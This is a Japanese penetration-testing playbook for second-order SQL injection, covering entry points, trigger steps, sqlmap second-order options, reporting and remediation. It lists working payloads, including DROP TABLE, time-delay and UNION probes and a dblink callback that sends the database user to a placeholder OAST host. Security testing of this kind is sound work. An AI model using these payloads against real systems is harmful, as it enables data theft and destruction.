# Second-Order SQL Injection

`references/sql-manual.md` の 1 次注入が成立しないが、入力が DB に保存されて後で別 query で消費される系を扱う。

## いつ切替えるか

- 1 次 SQLi が成立しないが、input が DB に保存される機能がある
- 保存後に admin panel / report / batch / search などで再 query される導線がある
- multi-step workflow (signup → profile → search) で工程ごとに別の SQL が走る
- ORM / parameterized で入力経路は守られていても、後段で raw SQL に組立て直す処理がある

## Phase 1 — 入口と消費先のマッピング

```
入口 (sanitized): signup form / profile update / order note / file metadata / API meta
   ↓
保存
   ↓
消費 (raw SQL?): admin search / report / dashboard count / cron job / export
```

入力が安全に挿入できる「文字列」を試すと、保存はされるが応答に SQL error は出ない (1 次 SQLi では検知不能)。**この入力が後段で別 query に使われたとき**に発火する。

## Phase 2 — payload 設計

```
o'reilly                          → 一部 admin search で escape 漏れ
admin'-- -                        → username で受け、後で WHERE username = '...' に直挿入
test'); DROP TABLE x; --          → stacked queries が許される DB
test' UNION SELECT @@version --   → blind UNION
1; SELECT pg_sleep(5)             → MSSQL/Postgres の admin panel で stacked
'; INSERT INTO logs VALUES('xxx') --  → 副作用観測 (追加レコードを後から探す)
```

実装パターン別:

| パターン | 例 |
|---|---|
| username | signup `username='admin'-- -` → login 後 `SELECT ... WHERE username=$user` |
| filename | upload `filename='; SELECT pg_sleep(5);--` → admin file list で動的 SQL |
| referrer / UA | log table に保存され、admin の analytics で raw 集計 |
| profile bio | search 機能で keyword 部に直挿入 |

## Phase 3 — トリガ操作

入力後、消費する機能を意図的に呼び出す:

```
1. 攻撃 payload で入力 (例: profile を 'OR (SELECT pg_sleep(5))--')
2. admin panel が見れない場合は、自分で呼べる機能で誘発
   - 検索 / sort / filter
   - export CSV / report
   - cron が走るタイミング (定期処理)
3. 応答 / 時間遅延 / OAST callback で発火を確認
```

OAST callback (`interactsh-client`) を絡めると、admin が後で見たタイミングで callback が来るので blind でも確認できる:

```
payload: '; SELECT pg_sleep(5); SELECT 1 FROM pg_stat_activity WHERE 1=dblink_exec('http://my.oast.tld/?h='||current_user)
```

## Phase 4 — sqlmap 連携

sqlmap も second-order を扱える:

```
sqlmap -r insert_request.txt --second-url='https://target/admin/search?q=1' --batch
sqlmap -r register.txt --second-req=consume_request.txt --batch
```

`--second-req` は「保存後に消費する request」を渡せる。

## Phase 5 — 影響実証

通常の 1 次 SQLi と同じ列挙手段が使えるが、各 query が「保存→消費」の 2 ステップで増える。

```
1. payload を保存
2. 消費 endpoint を踏む / 待つ
3. 応答差 / 遅延 / OAST hit を観測
4. boolean / time blind で 1 文字ずつ抽出
```

## Phase 6 — レポート

```
- 入口 (どの form / API)
- 保存先 (DB column / log file / cache)
- 消費先 (どの admin / report / cron が再 query するか)
- payload と発火条件
- 抽出範囲 / 件数
- 修正 (消費側でも parameterized / type cast、storage 時に validate)
```

## 副作用の制限

INSERT / UPDATE / DELETE 系の payload を使う場合は test account の自身データに限定。本番 admin panel での連続 sleep 系は他ユーザに影響するため避ける。発火確認後に payload record を撤去する手順を含める。
